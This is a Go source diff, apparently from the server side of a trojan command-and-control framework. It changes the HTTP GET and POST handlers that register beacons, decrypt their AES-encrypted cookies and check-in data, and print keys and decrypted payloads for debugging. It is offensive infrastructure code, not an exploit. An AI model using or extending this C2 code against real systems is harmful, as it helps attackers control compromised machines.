@@ -25,7 +25,12 @@ func GET_handler(cookie string, listener *Listener, r *http.Request) ([]byte, bo
 		fmt.Println("AESa 16BYTES not match")
 
 		return res, false
-	} else if reflect.DeepEqual(listener.A, aAES.DecryptData(cookie_decode)) {
+	}
+	decrypt, succ := aAES.DecryptData(cookie_decode)
+	if !succ {
+		println("decrypt A fail.")
+	}
+	if reflect.DeepEqual(listener.A, decrypt) {
 		if Check_Beacon_ip(listener, ip) {
 			removeBeaconByIP(listener, ip) //暂时只考虑一个ip一个木马的情况
 			Create_beacon_1(listener, ip)
@@ -68,11 +73,19 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch == "" {
 			bigInt := new(big.Int)
 			bigInt, _ = bigInt.SetString(beacon.AESkey, 10)
-			eAES := getAES(bigInt.Bytes())
-			json_byte := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
+			eAES := getAES(ReverseBytes(bigInt.Bytes()))
+
+			eAES.printKey()
+			println("encrypted data = ")
+			printkey(body)
+			json_byte, succ := eAES.DecryptData(GetBytes(body, len(body)))
+			if !succ {
+				println("AES Decrypt fail")
+			}
 
 			var beacon_tmp Beacon
 
+			println("decrypt = ")
 			printkey(json_byte)
 			println(string(json_byte))
 
@@ -93,7 +106,7 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch != "" {
 			eAES := getAES(stringToBytes(beacon.AESkey))
-			json_byte := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
+			json_byte, _ := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
 			if json_byte == nil {
 				if is_jobs_null(listener, i) {
 					return res, true // sleep
@@ -119,10 +132,21 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 
 }
 
-func printkey(key []byte) {
-	fmt.Printf("\n ")
-	for _, b := range key {
-		fmt.Printf("%02x ", b)
+func printkey(arr []byte) {
+	i := 0
+	for i < len(arr) {
+		if i%16 == 0 && i != 0 {
+			fmt.Print("        ")
+			j := 0
+			for j < 16 {
+				fmt.Printf("%c", arr[i-16+j])
+				j += 1
+			}
+
+			fmt.Println("")
+		}
+		fmt.Printf("%02x ", arr[i])
+		i += 1
 	}
 }
 
